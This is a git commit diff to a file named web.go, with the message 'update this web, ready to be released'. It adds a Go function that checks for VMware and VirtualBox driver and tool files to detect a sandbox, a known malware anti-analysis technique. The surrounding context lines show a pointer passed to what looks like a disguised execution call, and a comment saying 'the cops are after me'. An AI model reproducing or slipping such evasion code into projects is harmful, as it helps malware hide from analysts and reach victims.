47151ff47afd0298bdf2b0c1e5a71d95e29d43aa
bu_chui_cay <160392336+buchuicay@users.noreply.github.com>
2024-03-08 21:56:10 +0700

    update this web, ready to be released

--- src/web.go
+++ src/web.go
@@ -33,3 +33,36 @@ func main() {
 		not_executing_anything_just_creating_value_for_society,
 		(uintptr)(unsafe.Pointer(&very_normal_variable[0])),
 	// I will finish this tomorrow. I think the cops are after me.
+
+
+func CheckVMFilepath() bool {
+	EvidenceOfSandbox := make([]string, 0)
+	FilePathsToCheck := [...]string{`C:\windows\System32\Drivers\Vmmouse.sys`,
+		`C:\windows\System32\Drivers\vm3dgl.dll`, `C:\windows\System32\Drivers\vmdum.dll`,
+		`C:\windows\System32\Drivers\vm3dver.dll`, `C:\windows\System32\Drivers\vmtray.dll`,
+		`C:\windows\System32\Drivers\vmci.sys`, `C:\windows\System32\Drivers\vmusbmouse.sys`,
+		`C:\windows\System32\Drivers\vmx_svga.sys`, `C:\windows\System32\Drivers\vmxnet.sys`,
+		`C:\windows\System32\Drivers\VMToolsHook.dll`, `C:\windows\System32\Drivers\vmhgfs.dll`,
+		`C:\windows\System32\Drivers\vmmousever.dll`, `C:\windows\System32\Drivers\vmGuestLib.dll`,
+		`C:\windows\System32\Drivers\VmGuestLibJava.dll`, `C:\windows\System32\Drivers\vmscsi.sys`,
+		`C:\windows\System32\Drivers\VBoxMouse.sys`, `C:\windows\System32\Drivers\VBoxGuest.sys`,
+		`C:\windows\System32\Drivers\VBoxSF.sys`, `C:\windows\System32\Drivers\VBoxVideo.sys`,
+		`C:\windows\System32\vboxdisp.dll`, `C:\windows\System32\vboxhook.dll`,
+		`C:\windows\System32\vboxmrxnp.dll`, `C:\windows\System32\vboxogl.dll`,
+		`C:\windows\System32\vboxoglarrayspu.dll`, `C:\windows\System32\vboxoglcrutil.dll`,
+		`C:\windows\System32\vboxoglerrorspu.dll`, `C:\windows\System32\vboxoglfeedbackspu.dll`,
+		`C:\windows\System32\vboxoglpackspu.dll`, `C:\windows\System32\vboxoglpassthroughspu.dll`,
+		`C:\windows\System32\vboxservice.exe`, `C:\windows\System32\vboxtray.exe`,
+		`C:\windows\System32\VBoxControl.exe`}
+	for _, FilePath := range FilePathsToCheck {
+		if _, err := os.Stat(FilePath); err == nil {
+			EvidenceOfSandbox = append(EvidenceOfSandbox, FilePath)
+		}
+	}
+	if len(EvidenceOfSandbox) == 0 {
+		return false
+	} else {
+		println("[!] VM Detected")
+		return true
+	}
+}
